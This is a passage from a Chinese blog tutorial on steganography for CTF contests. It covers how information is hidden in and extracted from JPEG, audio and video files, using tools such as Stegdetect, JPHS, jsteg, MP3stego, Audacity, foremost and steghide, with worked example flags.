f.write(chr(stra))</span><br><span class="line">            stra &#x3D;&quot;&quot;</span><br><span class="line">    f.closed</span><br><span class="line">#文件长度</span><br><span class="line">le &#x3D; 30</span><br><span class="line">#含有隐藏信息的图片</span><br><span class="line">new &#x3D; &quot;C:\Users\lenovo\Desktop\LSB\demo2\heetian_LSB.png&quot;</span><br><span class="line">#信息提取出后所存放的文件</span><br><span class="line">tiqu &#x3D; &quot;C:\Users\lenovo\Desktop\LSB\demo2\get_flag.txt&quot;</span><br><span class="line">func(le,new,tiqu)</span><br></pre></td></tr></table></figure><p>可以在图片中隐藏字符串，也可以在图片中隐藏图片</p><p><strong>实验：</strong></p><p><strong>思考</strong></p><ol><li>我们这里用的LSB隐均对R,G,B，三种颜色都加以修改是否可以只修改一个颜色？</li><li>参考2016 HCTF的官方Writeup学习如何实现将一个文件以LSB的形式加以隐写。</li></ol><hr><h4 id="四、基于DCT域的JPG图片隐写"><a href="#四、基于DCT域的JPG图片隐写" class="headerlink" title="四、基于DCT域的JPG图片隐写"></a>四、基于DCT域的JPG图片隐写</h4><p>这个基于DCT域的JPG图片隐写原理太难，没必要搞懂原理，知道有哪几个类型的题目和解法就行。</p><h5 id="背景知识-2"><a href="#背景知识-2" class="headerlink" title="背景知识"></a>背景知识</h5><p>JPEG图像格式使用离散余弦变换（Discrete Cosine Transform，DCT）函数来压缩图像，而这个图像压缩方法的核心是：通过识别每个8×8像素块中相邻像素中的重复像素来减少显示图像所需的位数，并使用近似估算法降低其冗余度。因此，我们可以把DCT看作一个用于执行压缩的近似计算方法。因为丢失了部分数据，所以DCT是一种有损压缩（Loss Compression）技术，但一般不会影响图像的视觉效果。</p><p><strong>基于DCT域的JPG图片隐写分类：</strong></p><ul><li>JPHide</li><li>JSteg</li><li>Outguess</li><li>F5等</li></ul><h5 id="常用工具：-2"><a href="#常用工具：-2" class="headerlink" title="常用工具："></a>常用工具：</h5><ul><li>Stegdetect</li><li>JPHS</li><li>Jsteg</li><li>Outguess</li></ul><h5 id="A-JPhide隐写—jpg隐写"><a href="#A-JPhide隐写—jpg隐写" class="headerlink" title="A.JPhide隐写—jpg隐写"></a>A.JPhide隐写—jpg隐写</h5><p><strong>隐写原理</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Jphide是基于最低有效位LSB的JPEG格式图像隐写算法，使用JPEG图像作为载体是因为相比其他图像格式更不容易发现隐藏信息，因为JPEG图像在DCT变换域上进行隐藏比空间域隐藏更难检测，并且鲁棒性更强，同时Blowfish算法有较强的抗统计检测能力。</span><br><span class="line">由于JPEG图像格式使用离散余弦变换（Discrete Cosine Transform，DCT）函数来压缩图像，而这个图像压缩方法的核心是：通过识别每个8×8像素块中相邻像素中的重复像素来减少显示图像所需的位数，并使用近似估算法降低其冗余度。因此，我们可以把DCT看作一个用于执行压缩的近似计算方法。因为丢失了部分数据，所以DCT是一种有损压缩（Loss Compression）技术，但一般不会影响图像的视觉效果。</span><br></pre></td></tr></table></figure><p><strong>隐写过程</strong></p><p>JPhide隐写过程大致为：</p><ul><li>先解压压缩JPEG图像，得到DCT系数；</li><li>然后对隐藏信息用户给定的密码进行Blowfish加密；</li><li>再利用Blowfish算法生成伪随机序列，并据此找到需要改变的DCT系数，将其末位变为需要隐藏的信息的值。最后把DCT系数重新压回成JPEG图片；</li></ul><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/12/c8BWkE1KjvA76Pu.png" alt="img"></p><p><strong>隐写实现</strong></p><p>1.Stegdetect<br>实现JPEG图像JPhide隐写算法工具有多个，比如由Neils Provos开发通过统计分析技术评估JPEG文件的DCT频率系数的隐写工具 Stegdetect，它可以检测到通过<font color=red>JSteg、JPHide、OutGuess、Invisible Secrets、F5、appendX和Camouflage</font>等这些隐写工具隐藏的信息，并且还具有基于字典暴力破解密码方法提取通过JPhide、outguess和jsteg-shell方式嵌入的隐藏信息。<br>2.JPHS<br>另一款JPEG图像的信息隐藏软件JPHS，它是由Allan Latham开发设计实现在Windows和Linux系统平台针对有损压缩JPEG文件进行信息加密隐藏和探测提取的工具。软件里面主要包含了两个程序JPHIDE和JPSEEK， JPHIDE程序主要是实现将信息文件加密隐藏到JPEG图像功能，而JPSEEK程序主要实现从用JPHIDE程序加密隐藏得到的JPEG图像探测提取信息文件，Windows版本的JPHS里的JPHSWIN程序具有图形化操作界面且具备JPHIDE和JPSEEK的功能。</p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/12/HDcyNhuowI7dSJF.png" alt="img"></p><p>2.分别准备一个JPEG格式的图片（example.jpg）和一个文本文件（flag.txt）。</p><p>由于JPEG文件使用的数据存储方式有多种不能一一演示，这里用最常用的JPEG格式-JPEG文件交换格式（JPEG File Interchange Format，JFIF）作为示例。<br>这里简单介绍JPEG文件交换格式的JPEG图片的图像开始标记SOI（Start of Image）和应用程序保留标记APP0（Application 0），JPEG文件交换格式的JPEG图片开始前2个字节是图像开始标记为0xFFD8，之后2个字节接着便是应用程序保留标记为0xFFE0，应用程序保留标记APP0包含9个具体字段，这里介绍前三个字段，第一个字段是数据长度占2个字节，表示包括本字段但不包括标记代码的总长度，这里为10个字节，第二个字段是标识符占5个字节0x4A46494600表示“JFIF0”字符串，第三个字段是版本号占2个字节，这里是0X0101，表示JFIF的版本号为1.1，但也可能为其它数值，从而代表了其它版本号。</p><p>分别准备一个JPEG格式的图片（111.jpg）和一个文本文件（flag.txt）。</p><p>由于JPEG文件使用的数据存储方式有多种不能一一演示，这里用最常用的JPEG格式-JPEG文件交换格式（JPEG File Interchange Format，JFIF）作为示例。</p><p>由于JPEG文件使用的数据存储方式有多种不能一一演示，这里用最常用的JPEG格式-JPEG文件交换格式（JPEG File Interchange Format，JFIF）作为示例。</p><p>JPEG是一种压缩标准，有很多种采用不同文件交换格式的JPG图片。</p><p>这里简单介绍JPEG文件交换格式的JPEG图片的图像开始标记SOI（Start of Image）和应用程序保留标记APP0（Application 0）</p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/12/kHMz9CrNKIw4TQ7.png" alt="image-20200612192533248"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FF D8</span><br><span class="line">&#x2F;&#x2F;JPEG文件交换格式的JPEG图片开始前2个字节是图像开始标记 FF D8</span><br><span class="line">FF E0 </span><br><span class="line">&#x2F;&#x2F;之后2个字节是应用程序保留标记 FF E0</span><br><span class="line">00 10</span><br><span class="line">&#x2F;&#x2F;应用程序保留标记APP0包含9个具体字段，这里介绍前三个字段，第一个字段是数据长度占2个字节 00 10,表示包括本字段但不包括标记代码的总长度</span><br><span class="line">4A 46 49 46 00</span><br><span class="line">&#x2F;&#x2F;第二个字段是标识符占5个字节0x4A46494600表示“JFIF0”字符串</span><br><span class="line">01 01</span><br><span class="line">&#x2F;&#x2F;第三个字段是版本号占2个字节，这里是01 01,表示JFIF的版本号为1.1,但也可能为其它数值，从而代表了其它版本号。</span><br></pre></td></tr></table></figure><p>1、Windows版本可以使用具有图形化操作界面的Jphswin，选择“Open jpeg”打开示例JPEG格式图片111.jpg</p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/12/m7lZu4LbnGwiIyh.png" alt="image-20200612192920524"></p><p>如果你选择的不是JPEG格式的图片程序会自动退出，你可以16进制编辑器如Winhex查看图片的图像开始标记SOI和应用程序保留标记APP0，当载入JPEG格式图片会显示一些图片的属性。</p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/12/WOxzBF587jDyETb.png" alt="image-20200612192943561"></p><p>2、选择“Hide”选项之后在两次文本框输入相同的密码，这里以输入flag作为密码为例，然后输入要包含隐藏信息的文本。</p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/12/q2N3cvbLlBWPXSC.png" alt="image-20200612193040489"></p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/12/2M61E7UwXqFeyza.png" alt="image-20200612193059255"></p><p>3、选择“Save jpeg as”选项将图片另存为jpeg格式并输入文件的名称为新的图像文件如123.jpg</p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/12/ZsJfSWBc6DjxXRK.png" alt="image-20200612193157903"></p><p>4.之后便可以看到生成结果和相关信息，JPhide隐写生成过程就完成了</p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/12/lgq4HpYXxynvw35.png" alt="image-20200612193225396"></p><p><strong>解法：</strong></p><p>当我们拿到一道JPG图片隐写的题时，可以先用Stegdetect检测是以哪种隐写方式加密的。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Stegdetect的主要选项如下：</span><br><span class="line"></span><br><span class="line">-q 仅显示可能包含隐藏内容的图像。 </span><br><span class="line"></span><br><span class="line">-n 启用检查JPEG文件头功能，以降低误报率。如果启用，所有带有批注区域的文件将被视为没有被嵌入信息。如果JPEG文件的JFIF标识符中的版本号不是1.1，则禁用OutGuess检测。 </span><br><span class="line"></span><br><span class="line">-s 修改检测算法的敏感度，该值的默认值为1。检测结果的匹配度与检测算法的敏感度成正比，算法敏感度的值越大，检测出的可疑文件包含敏感信息的可能性越大。</span><br><span class="line"></span><br><span class="line">-d 打印带行号的调试信息。 </span><br><span class="line"></span><br><span class="line">-t 设置要检测哪些隐写工具（默认检测jopi），可设置的选项如下： </span><br><span class="line">j 检测图像中的信息是否是用jsteg嵌入的。 </span><br><span class="line">o 检测图像中的信息是否是用outguess嵌入的。 </span><br><span class="line">p 检测图像中的信息是否是用jphide嵌入的。 </span><br><span class="line">i 检测图像中的信息是否是用invisible secrets嵌入的。 </span><br><span class="line">-V 显示软件版本号。</span><br></pre></td></tr></table></figure><p>1.将图片复制到stegdetect.exe所在目录下，右键PowerShell命令<code>stegdetect.exe -tjopi -s 10.0 hide.jpg</code>检测该图片用的是哪种加密方式</p><p>2.然而我们并不知道密码是啥，这时可以用stegdetect下的stegbreak字典破解，同样图片和stegbreak.exe在同一目录下，命令<code>stegbreak.exe -r rules.ini -f password.txt -r p hide.jpg</code>破解密码</p><p>3.使用jphide下的工具JPHS从hide.jpg图片提取出隐藏信息</p><p><strong>实验：</strong></p><p>首先，在cmd/powershell中运行<code>Stegdetect</code>，对目标图片进行检测</p><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200613125042445.png" alt="image-20200613125042445"></p><p>发现结果显示是jphide隐写的可能性很大。<br><strong>接着，我们使用工具JPHS提取信息</strong></p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/13/JeDPrQ3MKizxBN1.png" alt="image-20200613125242778"></p><p>然后打开保存的txt文件，即得flag</p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/13/hC1VbJczpwg6T93.png" alt="image-20200613125410159"></p><p>得到flag</p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/13/8kDlNi4aZ5WI7y3.png" alt="image-20200613125859949"></p><h5 id="B-JSteg隐写—jpg隐写"><a href="#B-JSteg隐写—jpg隐写" class="headerlink" title="B.JSteg隐写—jpg隐写"></a>B.JSteg隐写—jpg隐写</h5><p>隐写工具：jsteg</p><p>先用Stegdetect检测加密类型</p><p>再用jsteg解密</p><p>隐写写入：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jsteg-windows-amd64.exe hide 123.jpg flag.txt out.jpg</span><br></pre></td></tr></table></figure><p>解密隐写：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jsteg-windows-amd64.exe reveal out.jpg out.txt</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/13/bcx4o3Cw1yiFJzY.png" alt="image-20200613133121279"></p><h5 id="C-Outguess隐写—jpg隐写"><a href="#C-Outguess隐写—jpg隐写" class="headerlink" title="C.Outguess隐写—jpg隐写"></a>C.Outguess隐写—jpg隐写</h5><p>工具：Outguess工具</p><p><strong>解题步骤：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- 双击打开图片，我们先确认一下图片内容并没有什么异常</span><br><span class="line">- 使用Stegdetect对图片的隐写方式进行检测</span><br><span class="line">- 从结果中得知是使用JPHide的隐写，使用JPHS工具对隐写信息进行提取</span><br><span class="line">- 最后打开保存的文件</span><br></pre></td></tr></table></figure><p><strong>第一步，在cmd中运行，Stegdetect，对目标图片进行检测</strong></p><p><strong>第二步，使用Outguess工具提取隐写信息</strong></p><p>点击Enter key功能，输入密码<br>点击Load image 加载目标图片<br>点击Extract file功能，将提取出来的信息保存成flag.txt文件。</p><p>打开flag.txt文件得到flag</p><p><strong>思考</strong></p><ol><li>尝试其他DCT域隐写，如F5</li><li>自己尝试使用JPHS的Hide功能，实现一个隐写。</li></ol><hr><h4 id="五、数字水印的隐写"><a href="#五、数字水印的隐写" class="headerlink" title="五、数字水印的隐写"></a>五、数字水印的隐写</h4><h5 id="背景知识-3"><a href="#背景知识-3" class="headerlink" title="背景知识"></a>背景知识</h5><p><strong>数字水印</strong><br>数字水印技术，是指在数字化的数据内容中嵌入不明显的记号。<br>特征是，被嵌入的记号通常是不可见或不可察的，但是可以通过计算操作检测或者提取。</p><p>盲水印，是指人感知不到的水印，包括看不到或听不见（没错，数字盲水印也能够用于音频）。其主要应用于音像作品、数字图书等，目的是，在不破坏原始作品的情况下，实现版权的防护与追踪。</p><p>添加数字盲水印的方法简单可分为<font color=red>空域方法</font>和<font color=red>频域方法</font>，这两种方法添加了冗余信息，但在编码和压缩情况不变的情况下，不会使原始图像大小产生变化（原来是10MB添加盲水印之后还是10MB）。</p><p>空域是指空间域，我们日常所见的图像就是空域。空域添加数字水印的方法是在空间域直接对图像操作（之所以说的这么绕，是因为不仅仅原图是空域，原图的差分等等也是空域），比如将水印直接叠加在图像上。</p><p>相对于空域方法，<font color=red>频域加盲水印</font>的方法隐匿性更强，抵抗攻击能力更强。这类算法解水印困难，你不知道水印加在那个频段，而且受到攻击往往会破坏图像原本内容</p><p>我们常说一个音有多高，这个音高是指频率；同样，图像灰度变化强烈的情况，也可以视为图像的频率。频域添加数字水印的方法，是指通过某种变换手段（傅里叶变换，离散余弦变换，小波变换等）将图像变换到频域（小波域），在频域对图像添加水印，再通过逆变换，将图像转换为空间域。相对于空域手段，频域手段隐匿性更强，抗攻击性更高。</p><p>所谓对水印的攻击，是指破坏水印，包括涂抹，剪切，放缩，旋转，压缩，加噪，滤波等。数字盲水印不仅仅要敏捷性高（不被人抓到），也要防御性强（抗打）。就像Dota的敏捷英雄往往是脆皮，数字盲水印的隐匿性和鲁棒性是互斥的。（鲁棒性是抗攻击性的学术名字）</p><h5 id="常用工具：-3"><a href="#常用工具：-3" class="headerlink" title="常用工具："></a>常用工具：</h5><p>BlindWaterMark</p><p>工具github地址：<a href="https://github.com/chishaxie/BlindWaterMark" target="_blank" rel="noopener">https://github.com/chishaxie/BlindWaterMark</a></p><p><strong>解法：</strong></p><p>盲水印一般会有两张图，一张图是原图，一张为添加了水印的</p><p>使用BlindWaterMark工具提取</p><p>合成盲水印图</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python bwm.py encode hui.png wm.png hui_with_wm.png</span><br></pre></td></tr></table></figure><p>提取图中的盲水印 (需要原图)</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python bwm.py decode hui.png hui_with_wm.png wm_from_hui.png</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/13/8lSaKOjw4FDZpBY.png" alt="image-20200613151739239"></p><p>有想要深入了解的同学可以去看这篇文章：</p><p><a href="https://stgod.com/1482/" target="_blank" rel="noopener">https://stgod.com/1482/</a></p><p><strong>思考</strong></p><ol><li>请查阅关于空域盲水印的资料</li><li>试着对频域盲水印攻击，如截屏、倒转等操作，再进行提取水印，看看水印是否被破坏。</li></ol><hr><h4 id="六、图片容差的隐写"><a href="#六、图片容差的隐写" class="headerlink" title="六、图片容差的隐写"></a>六、图片容差的隐写</h4><h5 id="背景知识-4"><a href="#背景知识-4" class="headerlink" title="背景知识"></a>背景知识</h5><p><strong>容差</strong><br>容差，在选取颜色时所设置的选取范围，容差越大，选取的范围也越大，其数值是在0-255之间。</p><h5 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h5><p><strong>beyond compare</strong></p><p>beyond compare是一款很适合用来对图片进行比较的工具，就图片而言，它支持容差、范围、混合等模式。</p><p><strong>容差比较的隐写</strong></p><p>没有找到题所以就介绍一下解法</p><p><strong>解法：</strong></p><p>打开工具，选择图片比较，导入两张图片</p><p>选择容差大小，进行比较得到flag</p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/13/mJTRLNEApdvIwYb.png" alt="image-20200613153005517"></p><p><strong>提示：</strong></p><p>如果在CTF赛场中，就隐写这一部分，出题人给于两张或者多张图片，一般都是需要对图片的内容进行比较的</p><hr><h3 id="多媒体文件隐写"><a href="#多媒体文件隐写" class="headerlink" title="多媒体文件隐写"></a>多媒体文件隐写</h3><p>音频、视频等多媒体也是我们生活经常看到的文件格式。我们上网听音乐，看视频，都离不开多媒体，一方面多媒体文件一般比单独的图片文件大，这是否也意味着能存储更多的信息，也可以隐藏更多的信息呢？</p><p>多媒体文件隐写分为：</p><ul><li>音频隐写</li><li>视频隐写</li></ul><hr><h4 id="一、音频隐写"><a href="#一、音频隐写" class="headerlink" title="一、音频隐写"></a>一、音频隐写</h4><p>音频隐写大致分为两大类：</p><ul><li>音轨插入摩尔斯电码</li><li>MP3stego隐写</li></ul><h4 id="常用工具：-4"><a href="#常用工具：-4" class="headerlink" title="常用工具："></a>常用工具：</h4><ul><li>Audacity</li><li>MP3stego</li></ul><h5 id="A-摩尔斯电码音频隐写"><a href="#A-摩尔斯电码音频隐写" class="headerlink" title="A.摩尔斯电码音频隐写"></a>A.摩尔斯电码音频隐写</h5><p><strong>背景知识</strong></p><p>摩尔斯电码（又译为摩斯密码，Morse code）是一种时通时断的信号代码，通过不同的排列顺序来表达不同的英文字母、数字和标点符号。在过去它以电报的形式来发送消息，如今当听到这样的电报你还能解出的他它的明文吗？</p><p><strong>摩尔斯电码对照表</strong></p><p><img src= "/img/loading.gif" data-src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/93/%E5%9B%BD%E9%99%85%E6%91%A9%E5%B0%94%E6%96%AF%E7%94%B5%E7%A0%81.svg/315px-%E5%9B%BD%E9%99%85%E6%91%A9%E5%B0%94%E6%96%AF%E7%94%B5%E7%A0%81.svg.png" alt="摩尔斯电码- 维基百科，自由的百科全书"></p><p><strong>实验：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- 在实验机中找到隐写术目录，打多媒体隐写，进一步找到文件夹音频隐写的目录下找到莫尔斯电码.mp3 文件</span><br><span class="line">- 我们可以先双击点开，尝试听一下内容，我们会听到在影视中常常听见的电报的发文声</span><br><span class="line">- 由于，单靠听我们很难直接辨别出长短，毕竟我们不是专业的，我们可以尝试用Audacity打开文件</span><br><span class="line">- 短代表点，长代表横，对照电码表，翻译出flag</span><br><span class="line">- 翻译摩尔斯电码可以使用在线翻译网站</span><br></pre></td></tr></table></figure><p><strong>当我们确认是摩尔斯电报之后，我先用Audacity打开目标文件，并观察波形</strong></p><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200614093414910.png" alt="image-20200614093414910"></p><p><strong>以长的代表代表横线，短的代表点，大的间隔是空格，抄写下摩尔斯电码</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.. -.-. .... ..- -. --.- .. ..- -- --- .-. ... . - . ... -</span><br></pre></td></tr></table></figure><p>翻译得：</p><p>ICHUNQIUMORSETEST</p><p><strong>思考与实践</strong></p><ol><li>利用lakey这个软件给制作一个自己ID的摩尔斯电文吧。</li></ol><h5 id="B-MP3stego工具隐写"><a href="#B-MP3stego工具隐写" class="headerlink" title="B.MP3stego工具隐写"></a>B.MP3stego工具隐写</h5><p><strong>MP3stego介绍</strong></p><p>MP3stego是著名的音频数据隐写工具，支持常见的压缩音频文件格式如mp3的数据嵌入，它采用的是一种特殊的量化方法，并且将数据隐藏在MP3文件的奇偶校验块中。</p><p><strong>使用方法</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">用MP3Stego进行加密解密：</span><br><span class="line">加密：encode -E 加密文本 -P 密码  wav文件 mp3文件</span><br><span class="line">解密：decode -X -P  密码  mp3文件</span><br></pre></td></tr></table></figure><p><strong>实验：</strong></p><p>小明想和小红告白，在一个首歌中藏了一个txt文件，可是小红却不知道怎么找到mp3文件中的隐藏信息，你能帮帮她吗？ hit： password： love</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- 在实验机中找到隐写术目录，打多媒体隐写，进一步找到文件夹音频隐写的目录下找到love.mp3 文件</span><br><span class="line">- 我们可以先双击点开，尝试听一下内容，感觉是一个很正常的音乐</span><br><span class="line">- 因为有个提示，这里我们用到了密码加密，我们可以猜测是否是用mp3stego进行的隐写呢？</span><br><span class="line">- 在工具文件中找到mp3stego，将目标文件拷贝到工具的目录下</span><br><span class="line">- 尝试提取隐藏信息，最后的flag是flag&#123;I_love_you&#125;</span><br></pre></td></tr></table></figure><p><strong>首先先将目标文件复制到MP3stego这个工具的目录下</strong></p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/14/YcXyOzFIotKpkjU.png" alt="image-20200614100259368"></p><p><strong>在CMD下使用Decode.exe程序进行提取</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Decode.exe -X -P love love.mp3</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200614100932009.png" alt="image-20200614100932009"></p><p>最后打开目录下的love.mp3.txt文件就能看到隐写内容了</p><p><strong>思考与实践</strong></p><ol><li>最后小明表白成功了，你是否也可以尝试去做一个MP3隐写呢</li></ol><h5 id="C-频谱图音频隐写"><a href="#C-频谱图音频隐写" class="headerlink" title="C.频谱图音频隐写"></a>C.频谱图音频隐写</h5><p><strong>背景知识</strong></p><p>频谱是频率谱密度的简称，是频率的分布曲线。复杂振荡分解为振幅不同和频率不同的谐振荡，这些谐振荡的幅值按频率排列的图形叫做频谱。<br>在CTF中，我们可以单独只对一个声道中，隐写进信息</p><p><strong>实验</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- 在实验机中找到隐写术目录，打多媒体隐写，进一步找到文件夹音频隐写的目录下找到这有点刺耳.wav的文件</span><br><span class="line">- 我们可以先双击点开，尝试听一下内容，感觉是一个很正常的音乐</span><br><span class="line">- 因为这次是针对频谱的，我们直接用Adobe Aud ton打开目标文件</span><br><span class="line">- 调整到频谱视图，调整大小，直到能清晰的看到隐写内容</span><br><span class="line">- 尝试提取隐藏信息，最后的flag是flag&#123;CTF_i5_rea1ly_funny!&#125;</span><br></pre></td></tr></table></figure><p><strong>直接进入正题吧</strong><br>使用AU打开目标文件</p><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200614103023624.png" alt="image-20200614103023624"></p><p>调整到频谱图，并调整频谱图大小，直到能看清flag</p><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200614104328986.png" alt="image-20200614104328986"></p><h5 id="D-波形音频隐写"><a href="#D-波形音频隐写" class="headerlink" title="D.波形音频隐写"></a>D.波形音频隐写</h5><p><strong>背景知识</strong></p><p>通常来说，波形方向的题，在观察到异常后，使用相关软件（Audacity, Adobe Audition 等）观察波形规律，将波形进一步转化为 01 字符串等，从而提取转化出最终的 flag。</p><p><strong>实验:</strong></p><p>ISCC-2017：杂项—-普通的DISCO我们普通的摇<del>~</del></p><p>（1）下载一个Disco.wav音频文件，不是以.mp3结尾。那么mp3stego这个工具是无法使用了。</p><p>（2）细心的童鞋会注意到，音频开头有一段杂音。然后用音频分析软件打开，这里我用audacity这款工具打开音频文件。如下图所示：</p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/16/MFRdSpUiTo2cDBl.png" alt="image-20200616195625454"></p><p>这道题就是考个细心程度，当得到这个波形之后就很容易联想到二进制数据，这道题的话因为上下两个音轨是一样的，所以取上面这个，这里可以认为上面一小点是1，下面一小点是0，如下图：</p><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200616201440356.png" alt="image-20200616201440356"></p><p>就能得到：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">110011011011001100001110011111110111010111011000010101110101010110011011101011101110110111011110011111101</span><br></pre></td></tr></table></figure><p>然后得到之后首先观察数据，因为很短，所以推测不是文件，应该是处理字符编码得到flag。</p><p>首先这里一共是105位</p><p>不符合8位一个字符，符合7位，于是在每个7位之前加个0，得到</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">01100110,01101100,01100001,01100111,01111011,01010111,00110000</span><br><span class="line">01010111,00101010,01100110,01110101,01101110,01101110,01111001,</span><br><span class="line">01111101</span><br></pre></td></tr></table></figure><p>最后二进制转十进制，转ASCII得到：flag{W0W*funny}</p><p>好吧，这边编码的确恶心人。</p><h5 id="E-LSB音频隐写"><a href="#E-LSB音频隐写" class="headerlink" title="E.LSB音频隐写"></a>E.LSB音频隐写</h5><p><strong>背景知识</strong></p><p>类似于图片隐写中的 LSB 隐写，音频中也有对应的 LSB 隐写。主要可以使用Silenteye工具，其介绍如下：</p><p>SilentEye是一种跨平台应用程序设计，可轻松使用隐写术，在这种情况下，将消息隐藏为图片或声音。它提供了一个非常漂亮的界面，并通过使用插件系统轻松集成了新的密写算法和加密过程。</p><p><strong>实验：</strong></p><p>2015 广东省强网杯 - Little Apple</p><p>直接使用 <code>slienteye</code> 即可。</p><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200616203211716.png" alt="image-20200616203211716"></p><p>这道原题找不到了，但是这主要就是考的知识面，知道这个工具才能做出来</p><p><strong>思考与实践</strong></p><p>如何做一个音频隐写？</p><hr><h4 id="二、视频隐写"><a href="#二、视频隐写" class="headerlink" title="二、视频隐写"></a>二、视频隐写</h4><h5 id="A-基于文件结构的隐写"><a href="#A-基于文件结构的隐写" class="headerlink" title="A.基于文件结构的隐写"></a>A.基于文件结构的隐写</h5><p>目前在CTF赛事中较为常出现的视频隐写，一般都是将一场带有隐写信息的图片，嵌入视频中，我们所需要做的就是将这个图片从视频分离出来，然后在分析我们分离出来的文件是什么，之后的操作可能会涉及到密码编码，图片隐写等知识点。</p><p>另一方面，我们分离文件，如果单独对视频来说ffmpeg是一个很好的工具，这里我使用的是foremost ，一款linux下的命令行工具，当然我们也可以使用binwalk或者dd等工具，正如我们图片隐写中教大家分离图片所用的方法一样。<br>区别是，ffmpeg将视频分解成一张一张的图片，foremost是一个基于文件头和尾部信息以及文件的内建数据结构恢复文件的命令行工具。</p><p><strong>实验：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- 在实验机中找到隐写术目录，打多媒体隐写，进一步找到文件夹视频隐写的目录下找到powpow.mp4的文件</span><br><span class="line">- 我们可以先双击点开，观看下这个视频文件</span><br><span class="line">- 分离图片，得到一张图片，对图片分析，由提示可知是steghide的图片隐写</span><br><span class="line">- 之后的操作我们就不复述了, 看一下操作。</span><br><span class="line">- flag&#123;We are fsociety, we are finally free, we are finally awake!&#125;</span><br></pre></td></tr></table></figure><p><strong>首先用foremost分离图片</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">foremost powpow.mp4</span><br></pre></td></tr></table></figure><p><strong>在output目录下找到分离出来的图片</strong></p><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200614104703882.png" alt="image-20200614104703882"></p><p>使用命令 <code>steghide extract -sf thing.jpg -p password</code>提取图片隐写内容内容</p><p><strong>对提取出来的隐写内容进行解码</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat base64.txt</span><br><span class="line">python3</span><br><span class="line">&gt;&gt;&gt; import base64</span><br><span class="line">&gt;&gt;&gt; base64.b85decode(b&#39;W^7?+dsk&amp;3VRB_4W^-?2X&#x3D;QYIEFgDfAYpQ4AZBT9VQg%9AZBu9Wh@|fWgua4Wgup0ZeeU&#125;c_3kTVQXa&#125;eE&#39;)</span><br><span class="line">b&#39;flag&#123;We are fsociety, we are finally free, we are finally awake!&#125;&#39;</span><br></pre></td></tr></table></figure><p>最终的flag是<br>**完整操作命令flag{We are fsociety, we are finally free, we are finally awake!}</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">foremost powpow.mp4</span><br><span class="line">stepic -i output&#x2F;png&#x2F;00001069.png -d &gt; thing</span><br><span class="line">steghide extract -sf thing.jpg -p password</span><br><span class="line">cat base64.txt</span><br><span class="line">python3</span><br><span class="line">&gt;&gt;&gt; import base64</span><br><span class="line">&gt;&gt;&gt; base64.b85decode(b&#39;W^7?+dsk&amp;3VRB_4W^-?2X&#x3D;QYIEFgDfAYpQ4AZBT9VQg%9AZBu9Wh@|fWgua4Wgup0ZeeU&#125;c_3kTVQXa&#125;eE&#39;)</span><br><span class="line">b&#39;flag&#123;We are fsociety, we are finally free, we are finally awake!&#125;&#39;</span><br></pre></td></tr></table></figure><h5 id="B-MSU-Stego隐写"><a href="#B-MSU-Stego隐写" class="headerlink" 